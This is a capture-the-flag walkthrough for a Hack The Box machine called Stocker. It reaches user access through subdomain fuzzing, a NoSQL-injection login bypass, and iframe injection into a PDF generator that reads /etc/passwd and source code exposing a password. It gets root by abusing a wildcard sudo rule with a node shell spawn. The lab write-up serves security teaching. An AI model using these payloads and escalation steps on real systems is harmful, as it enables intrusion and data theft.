<h2> Target: 10.129.6.168  Stocker </h2>

<b>Initial Access</b> <br>
nmap -Pn --min-rate=5000 10.129.6.168 -p- |grep open|awk -F / '{print $1}'|tr '\n' ',' <br>
The output shows open ports: 22,80

Enumerate these open ports further with nmap: <br>
nmap -Pn --min-rate=5000 10.129.6.168 -p 22,80 -sC -sV -oN nmap.stocker 
 
![image](https://user-images.githubusercontent.com/93153300/213291375-8fd918f3-2fd8-442f-a0e0-c1acbf16d3d6.png)
 
Nmap shows a redirect on port 80 to stocker.htb.  To enable this redirect add it into the file /etc/hosts: 10.129.6.168 stocker.htb

Visiting port 80 shows:

![image](https://user-images.githubusercontent.com/93153300/213291397-6ceffe5c-be1a-46ac-86a8-b7376bc255b1.png)

The site doesn’t have much of interest and directory brute forcing doesn’t find anything of interest.  However, the page does say they are working on developing a new site. Let’s check if we can find this site by brute forcing for subdomains: <br>
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.stocker.htb" -u "http://stocker.htb/" --hh 178

![image](https://user-images.githubusercontent.com/93153300/213291429-a75c508e-737a-440c-be99-8fae7fcab22f.png)
 
wfuzz found subdomain ‘dev’.  Add this into the file /etc/hosts: <br>
10.129.6.168   stocker.htb   dev.stocker.htb

Visiting http://dev.stocker.htb redirects to a login page: 
 
![image](https://user-images.githubusercontent.com/93153300/213291453-8156caf1-6f7c-47db-b6c1-b8cfad1bf68e.png)

We don’t have credentials, but we can try to bypass the login.  Hacktricks is a good reference for this: https://book.hacktricks.xyz/pentesting-web/login-bypass <br>
https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass

Step 1: Capture the login request in burp suite.   <br>
Step 2: Change the “Content-Type” to “Content-Type: application/json”. <br>
Step 3: Replace username=&password= with: {"username": {"$ne": null}, "password": {"$ne": null} }
 
![image](https://user-images.githubusercontent.com/93153300/213291483-0e9c051a-5249-4b9d-a89d-cca0bd03b754.png)

Step 4: Forward the request.  

We successfully bypass the login page, the website shows:
 
![image](https://user-images.githubusercontent.com/93153300/213291511-e9e7ccb7-a724-4fc5-917c-7be1a7b3369b.png)
 
The page has a function where you can add items to the cart, submit the order for the item, and then the page generates a pdf receipt of your order.  Let's try to exploit this pdf generator with xss to local file inclusion.  

Step 1: Click on “Add to Basket” on any of the items.    <br>
Step 2: Click on “View Cart” <br>
Step 3: Click on “Submit Purchase” and capture the request in burp suite:

 ![image](https://user-images.githubusercontent.com/93153300/213291545-257dc788-97b4-4d1f-857a-6f969bee2fe6.png)
 ![image](https://user-images.githubusercontent.com/93153300/213291574-eeaea8fb-4702-42e9-b888-da13e3c53eb1.png)

Step 4: Change the ‘title’ from ‘Axe’ to: <iframe src='file:///etc/passwd' width='600' height='1000'></iframe>

![image](https://user-images.githubusercontent.com/93153300/213291608-7530303b-7ca9-4bed-9729-ea8a514e5c73.png)
 
Step 5: Forward the request.  The website shows: 

![image](https://user-images.githubusercontent.com/93153300/213291667-7cfc430b-cc1f-46db-bda3-c4f158b8eccb.png)
 
Click on ‘here’ to generate the pdf receipt: 

![image](https://user-images.githubusercontent.com/93153300/213291702-e6060885-d953-4964-b8cc-b416183f2cf6.png)
 
We find that the pdf includes the file /etc/passwd.  The site is vulnerable to xss to local file inclusion.   <br>
The file /etc/passwd shows that their is a user by the name of ‘angoose’.  

Find the path that the dev.stocker.htb site is using.  Replace the previous iframe for /etc/passwd with: “title”:”<script>document.write(document.location.href)</script>” <br>
The pdf generated shows the path is /var/www/dev.  

Use the xss to lfi to read the source code to the file /var/www/dev/index.js.  Replace the previous script for the path with: "title":"<iframe src='file:///var/www/dev/index.js' width='600' height='1000'></iframe>", <br>
The pdf shows:
 
![image](https://user-images.githubusercontent.com/93153300/213291770-1c83474b-1e0d-4f76-be7b-1e9d2df6827f.png)


The source code to the file index.js shows a password of ‘IHeardPassphrasesArePrettySecure’.  Try to ssh into the user angoose with that password: ssh angoose@stocker.htb → enter password when prompted

It worked, we have shell as user angoose.  We can get the flag in /home/angoose/user.txt

____________________________________________________
<b>Privilege Escalation</b><br>
Run the command sudo -l
 
![image](https://user-images.githubusercontent.com/93153300/213291900-754ad2e6-ac9a-416d-b5de-cb330a6146b6.png)

This sudo command is insecure.  The sudo command pretty much gives us the ability to run any js file we want as root.  We don’t have write permissions in /usr/local/scripts/ but we can bypass this easily because of the wildcard before the ‘.js’.  We can run sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/anyfile.js.  

To make matters easier, the directory /home/angoose/ contains a file called flag.js:
 
![image](https://user-images.githubusercontent.com/93153300/213291923-93b6ce6e-5a63-49da-922e-c5b1f7989081.png)
 
This file already contains the js code needed to get the root flag.  To get the root flag run the command: sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/flag.js

Instead of just getting the root flag, let’s get a root shell.  If you are not familiar with js, see gtfobins: https://gtfobins.github.io/gtfobins/node/ 

Step 1: Change the code in flag.js to: require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]}) <br> 
Step 2: sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/flag.js

We have shell as root. 

